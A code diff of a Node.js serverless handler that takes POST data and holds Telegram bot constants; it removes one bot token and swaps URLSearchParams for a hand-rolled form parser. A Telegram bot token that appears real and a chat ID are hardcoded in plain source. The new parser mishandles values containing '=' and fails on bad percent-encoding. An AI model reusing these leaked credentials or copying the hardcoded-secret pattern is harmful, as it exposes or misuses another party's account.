@@ -15,8 +15,7 @@ if (!admin.apps.length) {
 }
 
 const db = admin.firestore();
-const BOT_TOKEN_ENTRANCE = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE";
-const BOT_TOKEN_EXIT = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE"; // 2nd Bot Token
+const BOT_TOKEN_EXIT = "8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE"; // Secondary Bot Token
 const CHAT_ID = "6886010817";
 
 module.exports = async (req, res) => {
@@ -29,7 +28,7 @@ module.exports = async (req, res) => {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(200).send('OK');
 
-    // --- ULTRA-ROBUST BODY PARSING (V40) ---
+    // --- FINAL FORTRESS PARSING (V41) ---
     let data = {};
     const rawBody = req.body;
 
@@ -38,14 +37,19 @@ module.exports = async (req, res) => {
             data = rawBody;
         } else {
             const bodyStr = Buffer.isBuffer(rawBody) ? rawBody.toString() : String(rawBody);
+            // Hybrid Parse: Try JSON, then Form
             if (bodyStr.trim().startsWith('{')) {
                 data = JSON.parse(bodyStr);
             } else if (bodyStr.includes('=')) {
-                const params = new URLSearchParams(bodyStr);
-                params.forEach((v, k) => { data[k] = v; });
+                bodyStr.split('&').forEach(pair => {
+                    const [k, v] = pair.split('=');
+                    data[decodeURIComponent(k)] = decodeURIComponent(v || '');
+                });
             }
         }
-    } catch (e) { console.warn("Parse warning:", e.message); }
+    } catch (e) {
+        console.error("V41 Parse Error:", e.message);
+    }
 
     const {
         sessionID,
